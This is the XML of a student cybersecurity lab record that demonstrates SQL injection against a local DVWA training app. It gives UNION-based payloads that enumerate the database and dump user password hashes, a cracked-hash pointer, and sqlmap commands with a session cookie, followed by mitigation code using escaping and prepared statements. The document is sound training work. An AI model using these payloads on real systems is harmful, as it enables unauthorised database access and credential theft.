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14</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Ex. No.: 14</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">              Perform an SQL Injection Attack Against MSSQL to Extract Databases</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Aim</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>To safely detect and demonstrate SQL injection vulnerabilities against a controlled, local MSSQL-</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>backed test application and to practice secure coding and remediation techniques.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tools:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>XAMPP (Apache + MySQL + PHP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>DVWA (Damn Vulnerable Web Application)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>SQL Injection:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>WHERE (username = 'admin' AND password = '') OR 1=1 OR ''</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Id =1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>$id = $_REQUEST[ 'id' ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    switch ($_DVWA['SQLI_DB']) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        case MYSQL:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            // Check database</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            $query = "SELECT first_name, last_name FROM users WHERE user_id = '$</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>id';";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Get Database:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Data base available in dvwa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Query:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1’ union select 1, table_schema from information_schema.tables union select 1, ‘1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Meaning:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The leading ' closes the application’s open quote.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>UNION SELECT 1, table_name — returns two columns to match id, title.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>FROM information_schema.tables WHERE table_schema = 'dvwa' — restricts to the dvwa schema.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>-- comments out the remainder of the original SQL to avoid syntax errors.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Get tables:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>classic UNION-based SQL injection attempt intended to enumerate database metadata</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Query:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1’ union select 1, table_name from information_schema.tables where table_schema= ‘dvwa’ union select 1, ‘1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Close an existing quoted value in the original query (1'),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Append rows from information_schema.tables (specifically the table_schema column) to the original</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>result set using UNION SELECT, and</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Add another UNION SELECT that supplies a harmless row (1, '1') to match column/type</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>requirements or confuse filters.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>User account will be in users table</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Get Column information of the table</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Get Columns:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Query:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1’ union select 1, column_name from information_schema.columns where table_schema =’dvwa’ and table_name =</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>‘users’ union select 1, ‘1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Get Username and Password:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Query: 1’ union select 1,concat(user, “:”,password) from dvwa.users union select 1,’1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Table columns</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> User id                First_name              Last_name               User             password</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>username password:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>admin: 5f4dcc3b5aa765d61d8327deb882cf99</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>use crackstation.net</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Mitigation:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>1.Escape when quotations are encountered</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>$id = $_POST[ 'id' ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2. Sanitize input and validate it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>$id = $_GET[ 'id' ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     // Was a number entered?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">     if(is_numeric( $id )) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">          $id = intval ($id);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">          switch ($_DVWA['SQLI_DB']) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            case MYSQL:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                // Check the database</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                $data = $db-</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>' );</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT );</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Open Zap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>In browser 127.0.0.1/DAWN enter admin:password</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>ZAP captures the request</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>It has session id</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Download SQLMAP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Unzip go that folder</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Cd C:\Users\balus\Downloads\sqlmap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Python sqlmap.py -h</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>python sqlmap.py -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>cookie="PHPSESSID=g833nc5k1lcj0nnggvumnfj1o4; security=low" --proxy="http://localhost:8080"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>-dbs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>security=low; PHPSESSID=g833nc5k1lcj0nnggvumnfj1o4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>-D dvwa –tables</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Results: Inputs tested and observed server responses</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Department of Computer Science and Engineering (Cyber Security)/CR23331</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:drawing>
          <wp:inline xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
            <wp:extent cx="5029200" cy="6087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87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46524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52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1637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3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7209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20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9405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40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5165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16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6394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39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5414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1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96445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6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48043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3321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2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55552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5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4989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890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